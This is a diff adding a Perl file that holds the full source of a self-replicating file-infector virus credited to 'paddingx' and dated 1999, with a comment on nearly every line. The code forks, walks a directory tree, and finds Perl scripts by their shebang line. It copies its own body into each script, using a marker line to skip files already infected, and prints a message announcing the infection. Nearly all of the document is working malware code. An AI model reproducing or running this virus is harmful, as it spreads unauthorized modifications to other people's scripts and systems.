@@ -1,0 +1,43 @@
+#!/usr/bin/perl
+ use File::Find;             #S he uses a module to find files, it's included all standart perl installations
+ &virus();                   #S calling of the sub Virus
+                             #S after Virus Sub is executed we see a little payload ( just in dropper ! )
+ print "\nThis program is infected by the Perl virus\n\n";
+
+ sub virus                   #S start of the virus part
+   {
+     my ( $pid, $new );      #S define local variables
+     if( $pid = fork ) { return; }
+     else
+       {
+         open( source, $0 );        #S open Virus File
+         finddepth ( \&infect, '/home/chris/test' );    #S '/home/chris/test' is the path where files should be infected
+         sub infect
+             {
+             open target, "$File::Find::name";          #S open the file we want to infect
+             $_ = <target>;                             #S read it into a string
+             if ( /(\#!.*perl)/ )                       #S check if we got a #! xxxx perl in the first line --> check if it is a perl file
+             {
+                 $_ = <target>;                         #S read the second line
+                 if( $_ ne "use File::Find;\n" )        #S if it uses the File::Find module it will not be infected --> infection mark
+                   {
+                     $new = $1 . "\nuse File::Find;\n&virus();\n" . $_;  #S Write first two lines of the virus into $NEW
+                     while( <target> ) { $new = $new . $_; }    #S Write the file we infect into $NEW
+                     seek(  source, 0, 0 );
+                      while( <source> ne "sub virus\n" ) { };   #S read our file until we find the virus procedure
+                      $new = $new . "\nsub virus\n";            #S write 'sub virus' into $NEW
+                      while( <source> ) { $new = $new . $_; }   #S append the rest of the virus to $NEW
+                      close  target;                        #S close the file we infect
+                      open   target, ">$File::Find::name";  #S open it again for writing
+                      print  target $new;                   #S write $new into the file
+                   }
+               }
+             close( target );    #S close file we infected
+           }
+         close( source );        #S close virus file
+         exit( 0 );              #S exit program
+       }
+  }
+
+ # a Perl virus, by paddingx
+ # 08/15/1999
